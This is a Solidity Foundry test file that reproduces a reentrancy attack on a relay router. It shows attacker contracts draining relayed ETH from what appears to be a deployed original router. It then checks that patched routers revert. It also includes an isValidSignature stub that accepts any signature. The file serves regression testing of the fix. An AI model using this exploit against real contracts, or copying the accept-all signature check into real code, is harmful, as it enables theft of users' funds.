// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {Multicaller} from "../src/v1/Multicaller.sol";
import {ERC20Router} from "../src/v1/ERC20RouterV1.sol";
import {RelayRouter} from "../src/v2/RelayRouter.sol";
import {Call3Value, Permit, Result} from "../src/v2/utils/RelayStructs.sol";
import {Attacker} from "./mocks/Attacker.sol";

interface iM {
    function multicall(
        Call3Value[] calldata calls,
        address refundTo,
        address nftRecipient
    ) external payable returns (Result[] memory returnData);

    function setApprovalForAll(address operator, bool approved) external;
}

contract ReentrancyTest is Test {
    error Unauthorized();
    error Reentrancy();
    address PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    address routerV1;
    address updatedRouterV1;
    address routerV2;
    Attacker attacker1;
    Attacker attacker2;
    Attacker attacker3;
    address solver = 0xf70da97812CB96acDF810712Aa562db8dfA3dbEF;
    address multicaller;

    function setUp() public {
        console.log("SETUP");
        routerV1 = 0xA1BEa5fe917450041748Dbbbe7E9AC57A4bBEBaB;
        updatedRouterV1 = address(
            new ERC20Router(PERMIT2, address(0), address(this))
        );
        Multicaller multicaller = new Multicaller();
        ERC20Router(payable(updatedRouterV1)).setMulticaller(
            address(multicaller)
        );
        routerV2 = address(new RelayRouter());
        // Attempt to reenter in ERC20Router
        attacker1 = new Attacker(
            address(routerV1),
            address(multicaller),
            true,
            false,
            false
        );
        // Attempt to reenter in RelayRouter
        attacker2 = new Attacker(
            address(routerV2),
            address(multicaller),
            false,
            true,
            false
        );
        // Attempt to reenter in Multicaller
        attacker3 = new Attacker(
            address(routerV1),
            address(multicaller),
            false,
            false,
            true
        );
    }

    //this is what can happen if the attacker waponized the bug
    function testMoneyStealerStealDoAttack() public {
        console.log("TESTING ATTACK");
        moneyStealerStealAttack();
    }

    function moneyStealerStealAttack() internal {
        uint256 relayed_value = 0.0208 ether;

        address[] memory targets = new address[](1);
        targets[0] = address(attacker1);

        bytes[] memory datas = new bytes[](1);
        datas[0] = "";

        uint256[] memory values = new uint256[](1);
        values[0] = relayed_value;

        Call3Value[] memory calls = new Call3Value[](1);
        calls[0] = Call3Value({
            target: address(attacker2),
            allowFailure: false,
            value: relayed_value,
            callData: ""
        });

        bytes memory payloadV1 = abi.encodeWithSelector(
            ERC20Router.delegatecallMulticall.selector,
            targets,
            datas,
            values,
            address(0)
        );

        bytes memory payloadV2 = abi.encodeWithSelector(
            RelayRouter.multicall.selector,
            calls,
            address(0),
            address(0)
        );

        targets[0] = address(attacker3);

        bytes memory payloadV3 = abi.encodeWithSelector(
            ERC20Router.delegatecallMulticall.selector,
            targets,
            datas,
            values,
            address(0)
        );

        targets[0] = address(attacker1);

        bytes memory payloadV4 = abi.encodeWithSelector(
            ERC20Router.delegatecallMulticall.selector,
            targets,
            datas,
            values,
            address(0)
        );

        bool success;

        uint256 attacker1_initial_balance = address(attacker1).balance;
        uint256 attacker2_initial_balance = address(attacker2).balance;
        uint256 attacker3_initial_balance = address(attacker3).balance;
        uint256 routerV1_initial_balance = routerV1.balance;
        uint256 routerV2_initial_balance = routerV2.balance;
        uint256 updatedRouterV1_initial_balance = updatedRouterV1.balance;

        console.log("ATTACKER1 INITIAL BALANCE", attacker1_initial_balance);
        console.log("ATTACKER2 INITIAL BALANCE", attacker2_initial_balance);
        console.log("ATTACKER3 INITIAL BALANCE", attacker3_initial_balance);
        console.log("ROUTER1 INITIAL BALANCE", routerV1_initial_balance);
        console.log("ROUTER2 INITIAL BALANCE", routerV2_initial_balance);
        console.log(
            "UPDATED ROUTER1 INITIAL BALANCE",
            updatedRouterV1_initial_balance
        );

        // Original vulnerability
        vm.startPrank(solver);
        (success, ) = routerV1.call{value: relayed_value}(payloadV1);
        if (!success) {
            revert();
        }

        // Updated RelayRouter with ReentrancyGuard
        vm.expectRevert("Multicall3: call failed");
        (success, ) = routerV2.call{value: relayed_value}(payloadV2);
        if (!success) {
            revert();
        }

        // Attempt to reenter in ERC20Router
        vm.expectRevert(Reentrancy.selector);
        (success, ) = updatedRouterV1.call{value: relayed_value}(payloadV3);
        if (!success) {
            revert();
        }

        // Attempt to reenter in Multicaller
        vm.expectRevert(Reentrancy.selector);
        (success, ) = updatedRouterV1.call{value: relayed_value}(payloadV4);
        if (!success) {
            revert();
        }

        vm.stopPrank();

        uint256 attacker1_final_balance = address(attacker1).balance;
        uint256 attacker2_final_balance = address(attacker2).balance;
        uint256 attacker3_final_balance = address(attacker3).balance;
        uint256 attacker1_profit = attacker1_final_balance -
            attacker1_initial_balance;
        uint256 attacker2_profit = attacker2_final_balance -
            attacker2_initial_balance;
        uint256 attacker3_profit = attacker3_final_balance -
            attacker3_initial_balance;

        uint256 routerV1_difference = routerV1.balance -
            routerV1_initial_balance;
        uint256 routerV2_difference = routerV2.balance -
            routerV2_initial_balance;
        uint256 updatedRouterV1_difference = updatedRouterV1.balance -
            updatedRouterV1_initial_balance;

        console.log("ATTACKER1 PROFIT", attacker1_profit);
        console.log("ATTACKER2 PROFIT", attacker2_profit);
        console.log("ATTACKER3 PROFIT", attacker3_profit);
        console.log("ROUTER1 DIFFERENCE", routerV1_difference);
        console.log("ROUTER2 DIFFERENCE", routerV2_difference);
        console.log("UPDATED ROUTER1 DIFFERENCE", updatedRouterV1_difference);

        assertEq(attacker1_profit, relayed_value);
        assertEq(attacker2_profit, 0);
        assertEq(attacker3_profit, 0);
        assertEq(routerV1_difference, 0);
        assertEq(routerV2_difference, 0);
        assertEq(updatedRouterV1_difference, 0);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        iM(msg.sender).setApprovalForAll(
            0x1E0049783F008A0085193E00003D00cd54003c71,
            true
        );

        //approve the OpenSea conduit so we can list the listing
        return this.onERC1155Received.selector;
    }

    //so this contract can list on OpenSea
    function isValidSignature(
        bytes32 _hash,
        bytes memory _signature
    ) public pure returns (bytes4 magicValue) {
        magicValue = this.isValidSignature.selector;
    }

    receive() external payable {}

    function stealthemoney() external payable {}

    fallback() external payable {
        console.log("FALLBACK", msg.sender);
    }
}
